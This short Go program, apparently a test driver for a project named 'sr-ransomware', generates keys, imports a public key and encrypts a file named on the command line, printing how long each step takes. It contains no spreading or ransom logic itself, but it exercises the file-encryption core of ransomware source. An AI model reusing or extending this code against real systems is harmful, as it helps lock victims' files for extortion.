package main

import (
    "os"
    "fmt"
    "time"

    "github.com/sug0/sr-ransomware/go/crypto/scheme"
)

func main() {
    file := os.Args[1]

    t := time.Now()
    err := scheme.GenerateKeys()
    if err != nil {
        panic(err)
    }
    fmt.Printf("Keys generated in %s.\n", time.Since(t))

    t = time.Now()
    pk, err := scheme.ImportPublicKey()
    if err != nil {
        panic(err)
    }
    fmt.Printf("Public key imported in %s.\n", time.Since(t))

    t = time.Now()
    err = scheme.EncryptFile(pk, file)
    if err != nil {
        panic(err)
    }
    fmt.Printf("File encrypted in %s.\n", time.Since(t))
}
